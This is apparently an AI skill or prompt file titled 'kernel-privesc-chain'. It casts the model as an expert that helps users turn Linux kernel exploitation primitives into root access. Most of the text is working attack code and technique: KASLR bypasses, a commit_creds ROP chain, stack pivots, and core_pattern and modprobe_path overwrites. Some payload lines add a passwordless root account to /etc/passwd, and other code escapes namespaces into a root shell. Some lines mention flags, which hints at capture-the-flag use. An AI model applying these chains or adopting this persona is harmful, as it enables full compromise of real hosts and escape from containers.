---
name: kernel-privesc-chain
description: Build kernel privilege escalation chains including KASLR bypass, ROP chain construction, credential modification, namespace escape, and core_pattern/modprobe_path overwrites. Use after gaining a kernel exploitation primitive (read/write/function pointer control).
---

# Kernel Privilege Escalation Chain

You are an expert at building privilege escalation chains for Linux kernel exploits. Given an exploitation primitive (arbitrary read, arbitrary write, function pointer control, or code execution), help the user escalate to root.

## Phase 1: KASLR Bypass

Choose the appropriate technique based on available primitives. See [kaslr-bypass.md](kaslr-bypass.md) for detailed implementations.

### Method 1: Kernel Pointer Leak (Most Common)
If you can read data from a freed/corrupted kernel object:
- Look for function pointers at known offsets (ops structures)
- Common leaked symbols: `nft_counter_ops`, `nft_ct_expect_obj_ops`, `tbf_qdisc_ops`, `packet_rcv_fanout`, `shmem_file_operations`
- Calculate: `kbase = leaked_ptr - symbol_offset`
- Symbol offsets come from `/proc/kallsyms` (on debug) or `vmlinux` analysis

### Method 2: Cache Timing Side-Channel
If you have no leak primitive:
- Prefetch + rdtsc timing to detect kernel text mapping
- Scan range: `0xffffffff80000000` to `0xffffffffc0000000`, 2MB-aligned
- ~200 trials per candidate address, majority voting
- Works without any vulnerability-based information leak

### Method 3: BPF JIT Pack Allocator (Module KASLR)
- BPF JIT allocations reveal module region layout
- Pack allocator has predictable placement properties
- Used in CVE-2025-21700 for module KASLR bypass

### Method 4: PTE Value Extraction
- If you can read page table entries, physical addresses reveal layout
- `empty_zero_page` PTE is at a known physical offset
- Calculate kernel virtual base from physical mapping

## Phase 2: ROP Chain Construction

See [rop-patterns.md](rop-patterns.md) for gadget templates.

### Standard Privilege Escalation ROP Chain
```c
/* Gadgets needed (find via ROPgadget on vmlinux): */
unsigned long pop_rdi_ret;          // pop rdi ; ret
unsigned long pop_rsi_ret;          // pop rsi ; ret
unsigned long mov_rdi_rax_jmp_rcx;  // mov rdi, rax ; jmp rcx (or call rcx variant)
unsigned long pop_rcx_ret;          // pop rcx ; ret
unsigned long ret;                  // ret (for stack alignment)

/* Kernel functions: */
unsigned long prepare_kernel_cred;
unsigned long commit_creds;
unsigned long find_task_by_vpid;
unsigned long switch_task_namespaces;
unsigned long init_nsproxy;          // &init_nsproxy (data symbol)
unsigned long swapgs_restore;        // swapgs_restore_regs_and_return_to_usermode

/* Build chain: */
rop[i++] = pop_rdi_ret;
rop[i++] = 0;                       // rdi = NULL (create root cred)
rop[i++] = prepare_kernel_cred;     // rax = new_cred
rop[i++] = pop_rcx_ret;
rop[i++] = commit_creds;
rop[i++] = mov_rdi_rax_jmp_rcx;     // commit_creds(new_cred)

/* Namespace escape (if started in user namespace): */
rop[i++] = pop_rdi_ret;
rop[i++] = 1;                       // rdi = 1 (init PID)
rop[i++] = find_task_by_vpid;       // rax = init task
rop[i++] = pop_rcx_ret;
rop[i++] = pop_rsi_ret;
rop[i++] = mov_rdi_rax_jmp_rcx;     // rdi = init task
rop[i++] = init_nsproxy;            // rsi = &init_nsproxy
rop[i++] = switch_task_namespaces;  // switch to init namespaces

/* Return to userspace: */
rop[i++] = swapgs_restore + SWAPGS_OFFSET;  // offset to skip pops
// ... registers restored by swapgs_restore ...
// user_rip, user_cs, user_rflags, user_sp, user_ss pushed by save_state()
```

### Stack Pivot Gadgets
When you control a function pointer but not the stack:
```c
/* Common stack pivot patterns: */
// 1. push reg; pop rsp; ret
unsigned long push_rbx_pop_rsp = kbase + OFFSET;  // if rbx controllable

// 2. xchg rax, rsp; ret
unsigned long xchg_rax_rsp = kbase + OFFSET;  // if rax controllable

// 3. mov rsp, rbp; pop rbp; ret (leave; ret)
unsigned long leave_ret = kbase + OFFSET;  // if rbp controllable

// 4. pop rsp; ret
unsigned long pop_rsp_ret = kbase + OFFSET;  // stack at [current_rsp]
```

## Phase 3: Alternative Escalation Methods

### core_pattern Overwrite (Data-Only, No ROP Needed)
```c
/*
 * /proc/sys/kernel/core_pattern controls what runs when a process dumps core.
 * If it starts with '|', the rest is executed as root.
 *
 * 1. Overwrite core_pattern with: "|/path/to/payload"
 * 2. Create payload script that reads flag / adds backdoor user
 * 3. Trigger core dump (e.g., kill(getpid(), SIGSEGV))
 * 4. Kernel executes payload as root
 */
#define CORE_PATTERN_OFFSET  0xXXXXXX  // offset from kbase, find via kallsyms

// Write "|/tmp/x" to core_pattern address
char payload[] = "|/tmp/x";
arbitrary_write(kbase + CORE_PATTERN_OFFSET, payload, sizeof(payload));

// Create /tmp/x:
// #!/bin/sh
// cp /flag /tmp/flag && chmod 777 /tmp/flag
// Or: echo 'root2::0:0::/root:/bin/bash' >> /etc/passwd

// Trigger core dump:
*(volatile int *)0 = 0;  // SIGSEGV -> core dump -> payload executed as root
```

### modprobe_path Overwrite
```c
/*
 * modprobe_path is called when an unknown binary format is executed.
 * Default: "/sbin/modprobe"
 * Overwrite with path to payload, then trigger unknown binfmt.
 *
 * 1. Write "/tmp/x" to modprobe_path
 * 2. Create /tmp/x with exploit payload
 * 3. Create file with unknown magic: echo -ne '\xff\xff\xff\xff' > /tmp/trigger
 * 4. chmod +x /tmp/trigger && /tmp/trigger
 * 5. Kernel calls /tmp/x as root
 */
#define MODPROBE_PATH_OFFSET  0xXXXXXX

char payload[] = "/tmp/x";
arbitrary_write(kbase + MODPROBE_PATH_OFFSET, payload, sizeof(payload));
```

### Direct Cred Modification
```c
/*
 * If you have arbitrary write to known addresses:
 * 1. Find current task_struct via current_task per-cpu variable
 * 2. Follow task->cred pointer
 * 3. Zero out uid, gid, euid, egid, suid, sgid fields
 *
 * struct cred layout:
 *   0x00: atomic_t usage
 *   0x04: kuid_t uid, gid, suid, sgid, euid, egid, fsuid, fsgid
 *   0x24: ... capabilities ...
 */
```

## Phase 4: Namespace Setup and Escape

See [templates/namespace_setup.c](templates/namespace_setup.c) for implementation.

### Setup (Before Exploit)
```c
// Gain CAP_NET_ADMIN via user namespace
unshare(CLONE_NEWUSER | CLONE_NEWNET);
// Write UID/GID map
write_file("/proc/self/setgroups", "deny");
write_file("/proc/self/uid_map", "0 1000 1");
write_file("/proc/self/gid_map", "0 1000 1");
```

### Escape (After Achieving Root)
```c
// Method 1: setns to init namespaces
int fd = open("/proc/1/ns/mnt", O_RDONLY);
setns(fd, CLONE_NEWNS);
fd = open("/proc/1/ns/pid", O_RDONLY);
setns(fd, CLONE_NEWPID); // Note: only affects children
fd = open("/proc/1/ns/net", O_RDONLY);
setns(fd, CLONE_NEWNET);

// Method 2: Via ROP (in kernel context)
// switch_task_namespaces(current, &init_nsproxy);

// Then exec shell in host context
execve("/bin/sh", NULL, NULL);
```

## Phase 5: State Save/Restore for Kernel ROP

```c
/* Must save userspace state before entering kernel via ROP */
unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(void) {
    __asm__ volatile(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "pushfq\n"
        "pop %2\n"
        "mov %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_sp)
    );
}

/* Win function - called when ROP returns to userspace */
void win(void) {
    if (getuid() == 0) {
        printf("[+] Got root!\n");
        setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
        setns(open("/proc/1/ns/pid", O_RDONLY), 0);
        setns(open("/proc/1/ns/net", O_RDONLY), 0);
        char *argv[] = {"/bin/sh", NULL};
        execve("/bin/sh", argv, NULL);
    }
    printf("[-] Failed to get root\n");
    exit(1);
}
```

For complete code templates, see [templates/](templates/) directory.
